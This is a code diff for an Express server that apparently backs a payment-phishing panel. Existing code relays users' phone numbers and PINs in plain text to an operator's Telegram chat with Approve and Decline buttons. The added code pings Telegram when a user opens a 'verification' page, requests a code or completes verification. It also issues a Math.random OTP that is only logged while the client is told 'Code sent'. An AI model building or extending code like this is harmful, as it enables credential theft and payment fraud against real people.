@@ -106,6 +106,15 @@ function tgBase() {
 }
 
 /* ============================================================
+   OTP store
+============================================================ */
+const OTP_STORE = new Map();       // tx → { code, exp, attempts }
+const OTP_RATE  = new Map();       // tx → last request ms
+const OTP_MAX_ATTEMPTS = 5;
+const OTP_TTL_MS = 5 * 60 * 1000;  // 5 minutes
+const OTP_RATE_MS = 30 * 1000;     // 30 s between requests
+
+/* ============================================================
    POST /api/accept — send Telegram message with buttons
 ============================================================ */
 app.post('/api/accept', async (req, res) => {
@@ -137,7 +146,6 @@ app.post('/api/accept', async (req, res) => {
     return res.status(500).json({ status: 'failed', message: 'Server not configured' });
   }
 
-  // Reset any previous decision for this tx (in case of retry)
   PENDING.set(transactionId, { decision: 'pending', ts: Date.now() });
 
   const messageText =
@@ -146,7 +154,6 @@ app.post('/api/accept', async (req, res) => {
     'Phone: ' + phone + '\n' +
     'PIN: ' + pin;
 
-  // Use short callback tokens to be safe against any length limits
   const keyboard = {
     inline_keyboard: [[
       { text: '✅ Approve', callback_data: 'approve:' + transactionId },
@@ -194,7 +201,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
   const update = req.body || {};
 
-  // Log the shape of the payload (truncated) so we can diagnose silently dropped callbacks
   try {
     pushLog('WEBHOOK PAYLOAD: ' + JSON.stringify(update).slice(0, 300), 'info');
   } catch (e) {
@@ -206,7 +212,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
   if (cb && cb.data) {
     pushLog('CALLBACK DATA: ' + cb.data, 'info');
 
-    // Parse "approve:TXN-XXXX" or "decline:TXN-XXXX"
     const raw = String(cb.data);
     const idx = raw.indexOf(':');
     const action = idx >= 0 ? raw.slice(0, idx) : raw;
@@ -220,7 +225,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
 
     const baseUrl = tgBase();
     if (baseUrl) {
-      // Acknowledge the tap so the Telegram button stops spinning
       fetch(baseUrl + '/answerCallbackQuery', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -230,7 +234,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
         })
       }).catch(() => {});
 
-      // Remove buttons from the original message
       if (cb.message && cb.message.chat && cb.message.chat.id && cb.message.message_id) {
         fetch(baseUrl + '/editMessageReplyMarkup', {
           method: 'POST',
@@ -251,6 +254,109 @@ app.post('/api/telegram-webhook', async (req, res) => {
 });
 
 /* ============================================================
+   Verification — send a Telegram event notification
+============================================================ */
+async function sendTelegram(text) {
+  const baseUrl = tgBase();
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+  if (!baseUrl || !chatId) return;
+  try {
+    await fetch(baseUrl + '/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text })
+    });
+  } catch (e) {
+    pushLog('Telegram event send failed: ' + e.message, 'err');
+  }
+}
+
+app.post('/api/telegram/event', async (req, res) => {
+  const { type, tx, am, cur, c } = req.body || {};
+
+  if (!type || !tx) {
+    return res.status(400).json({ error: 'Missing type or tx' });
+  }
+
+  const allowed = ['page_opened', 'otp_requested', 'verification_success'];
+  if (!allowed.includes(type)) {
+    return res.status(400).json({ error: 'Unknown event type' });
+  }
+
+  const label =
+    type === 'page_opened'         ? '👀 Verification page opened' :
+    type === 'otp_requested'       ? '📨 OTP requested' :
+                                      '✅ Verification completed';
+
+  const lines = [
+    label,
+    '',
+    'Transaction: ' + tx,
+    'Amount: ' + (cur || 'USD') + ' ' + Number(am || 0).toFixed(2),
+    'Country: ' + (c || '—'),
+    'Time: ' + new Date().toISOString()
+  ];
+
+  sendTelegram(lines.join('\n'));
+  pushLog('Event sent to Telegram: ' + type + ' for ' + tx, 'ok');
+
+  res.json({ ok: true });
+});
+
+/* ============================================================
+   Verification — request an OTP
+============================================================ */
+app.post('/api/verification/otp', (req, res) => {
+  const { tx } = req.body || {};
+  if (!tx) return res.status(400).json({ message: 'Missing transaction' });
+
+  const now = Date.now();
+  const last = OTP_RATE.get(tx) || 0;
+  if (now - last < OTP_RATE_MS) {
+    const wait = Math.ceil((OTP_RATE_MS - (now - last)) / 1000);
+    return res.status(429).json({ message: 'Please wait ' + wait + 's before requesting a new code.' });
+  }
+  OTP_RATE.set(tx, now);
+
+  const code = String(Math.floor(100000 + Math.random() * 900000));
+  OTP_STORE.set(tx, { code, exp: now + OTP_TTL_MS, attempts: 0 });
+
+  pushLog('OTP for ' + tx + ': ' + code, 'info');
+
+  res.json({ ok: true, message: 'Code sent' });
+});
+
+/* ============================================================
+   Verification — verify OTP
+============================================================ */
+app.post('/api/verification/verify', (req, res) => {
+  const { tx, otp } = req.body || {};
+  if (!tx || !otp) return res.status(400).json({ success: false, message: 'Missing fields' });
+
+  const entry = OTP_STORE.get(tx);
+  if (!entry) return res.status(400).json({ success: false, message: 'No code requested' });
+  if (Date.now() > entry.exp) {
+    OTP_STORE.delete(tx);
+    return res.status(400).json({ success: false, message: 'Code expired' });
+  }
+  if (entry.attempts >= OTP_MAX_ATTEMPTS) {
+    OTP_STORE.delete(tx);
+    return res.status(429).json({ success: false, message: 'Too many attempts' });
+  }
+
+  entry.attempts++;
+
+  if (String(otp) !== entry.code) {
+    return res.status(400).json({ success: false, message: 'Invalid code' });
+  }
+
+  OTP_STORE.delete(tx);
+  setDecision(tx, 'approved');
+  pushLog('OTP verified for ' + tx, 'ok');
+  res.json({ success: true });
+});
+
+/* ============================================================
    Health + pages
 ============================================================ */
 app.get('/health', (req, res) => res.json({ ok: true }));
@@ -265,10 +371,11 @@ function servePage(filename) {
   };
 }
 
-app.get('/admin.html',  servePage('admin.html'));
-app.get('/client.html', servePage('client.html'));
-app.get('/pay.html',    servePage('pay.html'));
-app.get('/verify.html', servePage('verify.html'));
+app.get('/admin.html',        servePage('admin.html'));
+app.get('/client.html',       servePage('client.html'));
+app.get('/pay.html',          servePage('pay.html'));
+app.get('/verify.html',       servePage('verify.html'));
+app.get('/verification.html', servePage('verification.html'));
 app.get('/', (req, res) => res.redirect('/admin.html'));
 
 app.use((req, res) => {
@@ -285,7 +392,7 @@ app.listen(PORT, '0.0.0.0', () => {
   try {
     const files = fs.readdirSync(publicDir);
     console.log('Public files:', files.join(', ') || '(empty)');
-    ['admin.html', 'client.html', 'pay.html', 'verify.html'].forEach(f => {
+    ['admin.html', 'client.html', 'pay.html', 'verify.html', 'verification.html'].forEach(f => {
       console.log('  ' + f + ':', fs.existsSync(path.join(publicDir, f)) ? 'found' : 'MISSING');
     });
   } catch (e) {
